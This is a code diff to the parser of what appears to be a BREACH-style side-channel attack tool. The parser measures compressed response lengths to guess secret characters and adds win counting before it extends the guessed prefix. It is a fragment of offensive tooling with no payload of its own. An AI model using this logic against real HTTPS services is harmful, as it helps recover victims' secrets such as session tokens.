@@ -14,9 +14,9 @@ def signal_handler(signal, frame):
     '''
     Signal handler for killing the execution.
     '''
-    print('Exiting the program per your command')
+    print('Exiting parse.py per your command')
     system('rm -f out.out request.txt user_input.pyc hillclimbing.pyc constants.pyc connect.pyc')
-    system('mv basic_breach.log full_breach.log debug.log attack.log ' + parser.history_folder)
+    system('mv basic_breach.log full_breach.log debug.log attack.log win_count.log ' + parser.history_folder)
     sys.exit(0)
 signal.signal(signal.SIGINT, signal_handler)
 
@@ -68,6 +68,15 @@ class Parser():
             self.args_dict['debug_logger'] = self.debug_logger
         else:
             self.debug_logger = args_dict['debug_logger']
+        if 'win_logger' not in args_dict:
+            if self.verbose < 2:
+                self.setup_logger('win_logger', 'win_count.log', logging.ERROR)
+            else:
+                self.setup_logger('win_logger', 'win_count.log')
+            self.win_logger = logging.getLogger('win_logger')
+            self.args_dict['win_logger'] = self.win_logger
+        else:
+            self.win_logger = args_dict['win_logger']
         system('mkdir ' + self.history_folder)
         return
 
@@ -148,12 +157,11 @@ class Parser():
                 response_length = 0
                 in_bracket = True
                 after_start = False
-                illegal_request = False
-                illegal_next_response = False
+                illegal_semaphore = 6 # Discard the first three iterations so that the system is stabilized the system is stabilized
                 illegal_iteration = False
                 for line in output_file.readlines():
                     if len(buff) == len(self.alphabet):
-                        if illegal_iteration:
+                        if illegal_semaphore or illegal_iteration:
                             if not float(total_requests/len(self.alphabet)) in self.args_dict['illegal_iterations']:
                                 self.args_dict['illegal_iterations'].append(float(total_requests/len(self.alphabet)))
                             illegal_iteration = False
@@ -174,17 +182,12 @@ class Parser():
                         else:
                             if pref == 'User application payload' and int(size) > self.minimum_request_length:
                                 if self.iterations[self.alphabet[0]] and (response_length == 0):
-                                    illegal_request = True
-                                    illegal_next_response = True
+                                    illegal_semaphore = illegal_semaphore + 2
                                 if in_bracket:
-                                    if illegal_request:
+                                    if illegal_semaphore:
                                         buff.append('%d: 0' % prev_request)
+                                        illegal_semaphore = illegal_semaphore - 1
                                         illegal_iteration = True
-                                        illegal_request = False
-                                    elif illegal_next_response:
-                                        buff.append('%d: 0' % prev_request)
-                                        illegal_iteration = True
-                                        illegal_next_response = False
                                     else:
                                         buff.append('%d: %d' % (prev_request, response_length))
                                     prev_request = prev_request + 1
@@ -348,27 +351,38 @@ class Parser():
         '''
         Continue the attack properly, after checkpoint was reached.
         '''
+        sorted_wins = self.sort_dictionary_values(self.args_dict['win_count'], True)
         if len(correct_alphabet) == 1:
-            correct_item = points[0][1].split()[0].split(self.prefix)[1]
-            self.args_dict['prefix'] = self.prefix + correct_item
-            self.args_dict['divide_and_conquer'] = 0
-            self.args_dict['alphabet']= self.get_alphabet({'alpha_types': self.alpha_types, 'prefix': self.prefix, 'method': self.method})
-            self.attack_logger.debug('SUCCESS: %s' % correct_alphabet[0])
-            self.attack_logger.debug('Total time till now: %s' % str(datetime.datetime.now() - self.start_time))
-            self.attack_logger.debug('----------Continuing----------')
-            self.attack_logger.debug('Alphabet: %s' % str(self.alphabet))
-            self.continue_attack = True
+            if sorted_wins[0][0] > 10:
+                correct_item = points[0][1].split()[0].split(self.prefix)[1]
+                self.args_dict['prefix'] = self.prefix + correct_item
+                self.args_dict['divide_and_conquer'] = 0
+                self.args_dict['alphabet']= self.get_alphabet({'alpha_types': self.alpha_types, 'prefix': self.prefix, 'method': self.method})
+                self.attack_logger.debug('SUCCESS: %s' % correct_item)
+                self.attack_logger.debug('Total time till now: %s' % str(datetime.datetime.now() - self.start_time))
+                self.attack_logger.debug('----------Continuing----------')
+                self.attack_logger.debug('Alphabet: %s' % str(self.alphabet))
+            else:
+                self.args_dict['win_count'][sorted_wins[0][1]] = self.args_dict['win_count'][sorted_wins[0][1]] + 1
+                self.attack_logger.debug('Correct Alphabet: %d Incorrect Alphabet: %d' % (points[0][0], points[1][0]))
+                self.attack_logger.debug('Alphabet: %s' % str(self.alphabet))
         else:
-            self.args_dict['divide_and_conquer'] = self.divide_and_conquer + 1
-            correct_alphabet = points[0][1].split()
-            for i in enumerate(correct_alphabet):
-                correct_alphabet[i[0]] = i[1].split(self.prefix)[1]
-            self.args_dict['alphabet'] = self.continue_parallel_division(correct_alphabet)
-            self.continue_next_hop = True
+            self.attack_logger.debug('Correct Alphabet: %s' % points[0][1])
             self.attack_logger.debug('Correct Alphabet: %d Incorrect Alphabet: %d' % (points[0][0], points[1][0]))
-            self.attack_logger.debug('Alphabet: %s' % str(self.alphabet))
+            if sorted_wins[0][0] > 10:
+                self.args_dict['win_count'] = {}
+                self.args_dict['divide_and_conquer'] = self.divide_and_conquer + 1
+                correct_alphabet = points[0][1].split()
+                for i in enumerate(correct_alphabet):
+                    correct_alphabet[i[0]] = i[1].split(self.prefix)[1]
+                self.args_dict['alphabet'] = self.continue_parallel_division(correct_alphabet)
+                self.attack_logger.debug('SUCCESS: %s' % points[0][1])
+            else:
+                self.args_dict['win_count'][sorted_wins[0][1]] = self.args_dict['win_count'][sorted_wins[0][1]] + 1
+        new_sorted_wins = self.sort_dictionary_values(self.args_dict['win_count'], True)
+        self.win_logger.debug('Total attempts: %d\n%s' % (self.try_counter + 1, str(new_sorted_wins)))
         self.args_dict['latest_file'] = 0
-        return
+        return True
 
     def prepare_parsing(self):
         '''
@@ -380,6 +394,9 @@ class Parser():
         if not self.divide_and_conquer:
             self.alphabet = self.get_alphabet({'alpha_types': self.alpha_types, 'prefix': self.prefix, 'method': self.method})
             self.args_dict['alphabet'] = self.alphabet
+            if not self.args_dict['win_count']:
+                for item in self.alphabet:
+                    self.args_dict['win_count'][item] = 0
         system('cp request.txt ' + self.wdir)
 
         if self.execute_breach:
@@ -393,7 +410,10 @@ class Parser():
             else:
                 self.connector = self.args_dict['connector']
 
-        self.filename = '_'.join(self.alpha_types) + '_' + self.prefix + '_' + str(self.divide_and_conquer)
+        self.try_counter = 0
+        for _, value in self.args_dict['win_count'].items():
+            self.try_counter = self.try_counter + value
+        self.filename = 'try' + str(self.try_counter) + '_' + '_'.join(self.alpha_types) + '_' + self.prefix + '_' + str(self.divide_and_conquer)
         system('mkdir ' + self.history_folder + self.filename)
         system('cp request.txt ' + self.history_folder + self.filename + '/request_' + self.filename)
         if self.method == 'p' and self.correct_val:
@@ -405,7 +425,6 @@ class Parser():
                 self.correct_val = None
         self.checkpoint = self.max_iter
         self.continue_next_hop = False
-        self.continue_attack = False
         while path.isfile(self.history_folder + self.filename + '/out_' + self.filename + '_' + str(self.latest_file)):
             self.latest_file = self.latest_file + 1
 
@@ -445,11 +464,11 @@ class Parser():
             system('cat ' + self.history_folder + self.filename + '/result_' + self.filename)
             points = self.sort_dictionary_values(points, True)
             if (self.method == 'p' and points[0][0] > self.checkpoint/2) or (self.method == 's' and points[0][0] > self.checkpoint*10):
-                self.attack_forward(correct_alphabet, points)
+                continue_next_hop = self.attack_forward(correct_alphabet, points)
                 break
             time.sleep(self.refresh_time)
         if self.execute_breach:
-            if not self.continue_next_hop and not self.continue_attack:
+            if not continue_next_hop:
                 self.connector.join()
                 self.args_dict['latest_file'] = self.latest_file + 1
         return self.args_dict
